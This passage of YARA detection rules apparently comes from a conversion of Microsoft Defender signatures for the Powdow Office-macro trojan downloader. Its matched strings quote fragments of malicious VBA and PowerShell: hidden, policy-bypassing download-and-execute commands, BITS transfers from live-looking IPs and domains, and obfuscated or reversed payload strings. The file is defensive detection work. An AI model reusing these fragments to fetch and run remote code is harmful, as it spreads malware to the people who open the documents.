        $x_1_2 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 68 74 74 70 3a 2f 2f [0-55] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 68 72 28 33 34 29 20 26 20 22 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {70 73 6f 77 65 72 73 73 20 3d 20 22 70 6f 77 65 72 73 22 0d 0a 73 68 65 20 3d 20 22 73 68 65 6c 22}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TK_2147780930_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TK!MTB"
        threat_id = "2147780930"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set wshShell = objOL.CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_2 = "userprofile = wshShell.ExpandEnvironmentStrings(\"%userprofile%\")" ascii //weight: 1
        $x_1_3 = "final_str = final_str & " ascii //weight: 1
        $x_1_4 = "= commando_a_runear2 & \" '\" & directorio & \"'\"" ascii //weight: 1
        $x_1_5 = "wshShell.Run final_comando" ascii //weight: 1
        $x_1_6 = "= userprofile & Base64Decode(\"XGlhdG93ay5wczE=\", False)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BYK_2147780990_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BYK!MTB"
        threat_id = "2147780990"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nyKF_.rJ_p_8lil3RpqOvv_O_W" ascii //weight: 1
        $x_1_2 = "d___fsa = Chr(s__d - 22)" ascii //weight: 1
        $x_1_3 = ".Run(pMTv_7C2fYjN, t_OWJGxE7fdFxr_t_t)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BYK_2147780990_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BYK!MTB"
        threat_id = "2147780990"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HK8Pq.EYLELpctw3dQXdTA_n_f" ascii //weight: 1
        $x_1_2 = "d___fsa = Chr(s__d - 22)" ascii //weight: 1
        $x_1_3 = ".Run(Lg966a_8DV, ckF_w_haok1B2_JN7oO1slJt)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BYK_2147780990_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BYK!MTB"
        threat_id = "2147780990"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "th5__685.zTYJlT3ZqSjabVVFVHHa" ascii //weight: 1
        $x_1_2 = "d___fsa = Chr(s__d - 22)" ascii //weight: 1
        $x_1_3 = ".Run(RoouGg_TSZq_pydveOTZ, R__c1B5uM4c)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKQ_2147780991_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKQ!MTB"
        threat_id = "2147780991"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 22 20 26 20 [0-12] 29 2e 65 78 65 63 28 70 6f 77 65 72 72 61 6e 67 65 20 26 20 22 68 65 6c 6c 20 2d 77 20 22 20 26 20 70 72 6f 74 65 69 20 26 20 22 64 65 6e 20 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69}  //weight: 1, accuracy: Low
        $x_1_2 = "http://31.210.20.6/w2/PLP_017542000.ex" ascii //weight: 1
        $x_1_3 = {2d 4f 75 74 46 22 20 26 20 22 69 6c 65 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_UK_2147781077_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.UK!MTB"
        threat_id = "2147781077"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + Cells(7, 1), A2, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "= rev & Mid(fIopNCt, p, 1)" ascii //weight: 1
        $x_1_3 = "= fDyT(h87df00(), Cells(6, 1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_QTR_2147781824_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.QTR!MTB"
        threat_id = "2147781824"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= fso.OpenTextFile(\"C:\\Windows\\Temp\\bi.bat\", WR, True)" ascii //weight: 1
        $x_1_2 = "powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden" ascii //weight: 1
        $x_1_3 = ".DownloadString('https://paste.ee/r/4AIl0')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVB_2147781893_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVB!MTB"
        threat_id = "2147781893"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(34) & \"http://209.141.61.124/Q-2/fsoleApp1.ex\" & Chr(101)" ascii //weight: 1
        $x_1_2 = {61 6c 73 6f 74 72 75 65 20 3d 20 22 70 6f 77 65 72 73 22 0d 0a 74 68 69 6e 67 62 6f 78 20 3d 20 22 68 65 6c 6c 22}  //weight: 1, accuracy: High
        $x_1_3 = "CreateObject(\"Outlook.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVC_2147782017_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVC!MTB"
        threat_id = "2147782017"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call Shell(ChrEncode(\"706F7765727368656C6C2E657865202D657865637574696F6E706F6C69637920627970617373202D572048696464656E20" ascii //weight: 1
        $x_1_2 = "2E446F776E6C6F616446696C652827687474703A2F2F61706F2E70616C656E632E636C75623A32303935" ascii //weight: 1
        $x_1_3 = "For i = 1 To Len(str) Step 2" ascii //weight: 1
        $x_1_4 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BML_2147782514_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BML!MTB"
        threat_id = "2147782514"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 22 20 26 20 43 68 72 28 31 31 35 29 20 26 20 [0-25] 29 2e 52 75 6e 28 [0-25] 20 26 20 [0-25] 20 26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 22 20 26 20 43 68 72 28 31 31 35 29 20 26 20 22 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 22 20 26 20 43 68 72 28 33 34 29}  //weight: 1, accuracy: Low
        $x_1_2 = {68 74 74 60 70 3a 2f 2f 33 31 2e 32 31 30 2e 32 30 2e 34 35 2f 7a 43 48 2f [0-25] 2e 65 78}  //weight: 1, accuracy: Low
        $x_1_3 = {44 65 73 74 69 6e 61 74 69 6f 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-25] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"powers\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BML_2147782514_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BML!MTB"
        threat_id = "2147782514"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 22 20 26 20 [0-25] 29 2e 52 75 6e 28 [0-25] 20 26 20 [0-25] 20 26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 22 20 26 20 43 68 72 28 31 31 35 29 20 26 20 22 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 22 20 26 20 43 68 72 28 33 34 29}  //weight: 1, accuracy: Low
        $x_1_2 = {68 74 74 70 3a 2f 2f 33 31 2e 32 31 30 2e 32 30 2e 34 35 2f 31 78 42 65 74 2f [0-22] 2e 65 78}  //weight: 1, accuracy: Low
        $x_1_3 = {44 65 73 74 69 6e 61 74 69 6f 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-25] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"powers\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVD_2147782645_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVD!MTB"
        threat_id = "2147782645"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "objShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "pre = \"cmd.exe /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden \"" ascii //weight: 1
        $x_1_3 = ".DownloadFile('http://bartsimpson2.ignorelist.com/bart.jpg'" ascii //weight: 1
        $x_1_4 = "-FilePath $env:TEMP\\svchost.exe" ascii //weight: 1
        $x_1_5 = "Shell (exec2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVE_2147782758_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVE!MTB"
        threat_id = "2147782758"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Chr(34) & \"htt`p://31.210.20.45/527/IMG_077010168.ex\" & Chr(101)" ascii //weight: 1
        $x_1_2 = "Chr(34) & \"htt`p://31.210.20.45/527/4243pp14.ex\" & Chr(101)" ascii //weight: 1
        $x_1_3 = "Chr(34) & \"htt`p://212.192.241.94/bluehost/" ascii //weight: 1
        $x_1_4 = {3d 20 22 70 6f 77 65 72 73 22 0d 0a [0-18] 20 3d 20 22 68 65 6c 6c 22}  //weight: 1, accuracy: Low
        $x_1_5 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 22 20 26 20 43 68 72 28 31 31 35 29 20 26 20 [0-18] 29 2e 52 75 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RR_2147783194_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RR!MTB"
        threat_id = "2147783194"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=environ$(\"userprofile\")&" ascii //weight: 1
        $x_1_2 = ".send=.responsebodyif.status=200thenset=createobject(\"adodb.stream\").open.type=.write.savetofile" ascii //weight: 1
        $x_1_3 = "(\"h://www.j" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVG_2147783256_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVG!MTB"
        threat_id = "2147783256"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Kk = \"powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg\"" ascii //weight: 1
        $x_1_2 = "WggRK = StrReverse(\" cne- 1 w- ats- Pon- llehsrewop\")" ascii //weight: 1
        $x_1_3 = "asd = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = {61 73 64 2e 52 75 6e 20 28 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "AutoClose()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVH_2147783341_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVH!MTB"
        threat_id = "2147783341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_2 = "\"C:\\Users\\Public\\Documents\\drivehold.bat\"" ascii //weight: 1
        $x_1_3 = {22 70 6f 77 65 72 73 22 0d 0a 72 73 68 65 6c 6c 20 3d 20 22 68 65 6c 6c 22}  //weight: 1, accuracy: High
        $x_1_4 = "Start-BitsTransfer -Source http://212.192.241.94/news/IMG_1081007003xls.exe" ascii //weight: 1
        $x_1_5 = "C:\\Users\\Public\\Documents\\fieldwith.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVH_2147783341_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVH!MTB"
        threat_id = "2147783341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "wsh = VBA.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {65 72 72 6f 72 43 6f 64 65 20 3d [0-9] 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 62 79 70 61 73 73}  //weight: 1, accuracy: Low
        $x_1_3 = {41 75 74 6f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 72 73 68}  //weight: 1, accuracy: High
        $x_1_4 = "wsh.Run(pay, windowStyle, waitOnReturn)" ascii //weight: 1
        $x_1_5 = ".REAdtoeNd()')-'kSe',[]39  -([]49+[]84+[]120),[]124 -([]70+[]102+[]122),[]36) | & ( $PSHome[4]+$PSHome[34]+'x')\", windowStyle, waitOnReturn)" ascii //weight: 1
        $x_1_6 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 72 73 68}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRD_2147783359_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRD!MTB"
        threat_id = "2147783359"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".ExpandEnvironmentStrings(\"%appdata%\") & \"\\BadFile.e\" & \"xe\"" ascii //weight: 1
        $x_1_2 = {6c 61 73 74 6c 69 6e 65 64 65 6d 6f 2e 63 6f 6d 2f 64 65 6d 6f 2f 74 65 73 74 66 69 6c 65 73 2f 73 61 6d 70 6c 65 2f 73 61 6d 70 6c 65 5f 65 78 65 5f 30 30 2e 65 78 65 3f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = ".Run \"%COMSPEC% /C\" & runCmd" ascii //weight: 1
        $x_1_4 = "powershell.exe $webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('\" & fileLoc" ascii //weight: 1
        $x_1_5 = "Run_Program payloadLoc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BNQ_2147783647_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BNQ!MTB"
        threat_id = "2147783647"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powerr & rshell & \" -w h Start-BitsTransfer -Source" ascii //weight: 1
        $x_1_2 = "https://cargotrans-giobal.com/h/file.exe" ascii //weight: 1
        $x_1_3 = {44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRF_2147784056_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRF!MTB"
        threat_id = "2147784056"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"p\" & \"o\" & \"w\" & \"e\" & \"r\" & \"s\" & \"h\" & \"e\" & \"l\" & \"l\" & \" \" & \"-\" & \"w\" & \" \" & \"h\" & \"i\" & \"d\" & \"d\" & \"e\"" ascii //weight: 1
        $x_1_2 = "\"c \" & Chr(34) & \"$l\" & \"=\" & \"N\"" ascii //weight: 1
        $x_1_3 = "\".Credent\" & \"ialCac\" & \"he]::D\" & \"efaultCr\"" ascii //weight: 1
        $x_1_4 = "\"eden\" & \"tials;I\" & \"EX($\" & \"l.D\" & \"ownl\" & \"oa\" & \"dStr\"" ascii //weight: 1
        $x_1_5 = "'h\" & \"t\" & \"t\" & \"p\" & \"s\" & \":\" & \"/\" & \"/\" & \"r\" & \"a\" & \"w\" & \".\" & \"g\" & \"i\" & \"t\" & \"h\" & \"u\" & \"b\" & \"u\" & \"s\" & \"e\" & \"rcontent\" & \".co\" & \"m/ReactD\" & \"eveloper20\" & \"17/re\" & \"act/mas\" & \"ter/s\" & \"rc/test/te\" & \"st.js'))\" & Chr(34)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKNT_2147784845_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKNT!MTB"
        threat_id = "2147784845"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\Documents\\buildingsociety.bat\"" ascii //weight: 1
        $x_1_2 = "powerr & rl & \" -w h Start-BitsTransfer -Source" ascii //weight: 1
        $x_1_3 = "-Destination C:\\Users\\Public\\Documents\\factfriend.exe" ascii //weight: 1
        $x_1_4 = {43 61 6c 6c 20 [0-15] 2e 4f 70 65 6e 28 [0-15] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PSTT_2147784902_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PSTT!MTB"
        threat_id = "2147784902"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "A6%E2%46%57%66%F2%13%13%13%E2%83%53%13%E2%73%23%23%E2%23%93%13%F2%F2%A3%07%47%47%86%72%72%82%" ascii //weight: 1
        $x_1_2 = "%B2%72%46%72%B2%72%16%F6%72%B2%72%C6%E6%72%B2%72%77%F6%72%B2%72%44%E2%72%B2%72%92%47%E6%56%72%B2%72%96%C6%72%B2%" ascii //weight: 1
        $x_1_3 = "=srahCiicsa$ neddih elytSwodniW-" ascii //weight: 1
        $x_1_4 = "llehsrewo" ascii //weight: 1
        $x_1_5 = "Shell.Application" ascii //weight: 1
        $x_1_6 = "X`E`I|'' nioj- mj$;}))61,_$(61tniot::]trevnoc[(]rahc[{ hcaErof | )'%'(tilpS.srahCiicsa$=mj$;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKMT_2147785344_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKMT!MTB"
        threat_id = "2147785344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "otwg = otwg & " ascii //weight: 1
        $x_1_2 = ".Run(wjttawuooaxjkck, dkntlgktpsdktfu)" ascii //weight: 1
        $x_1_3 = "= Chr(fscv - 121)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKMT_2147785344_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKMT!MTB"
        threat_id = "2147785344"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + fd45cvv0, fgfjhfgfg, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "= GxhtKEm(BaVu, lLSU)" ascii //weight: 1
        $x_1_3 = "BKJaHfE.Name = \"Comments\" Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ALT_2147786737_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ALT!MTB"
        threat_id = "2147786737"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function rhzmeXT(fgfjhfgfg, fd45cvv0)" ascii //weight: 1
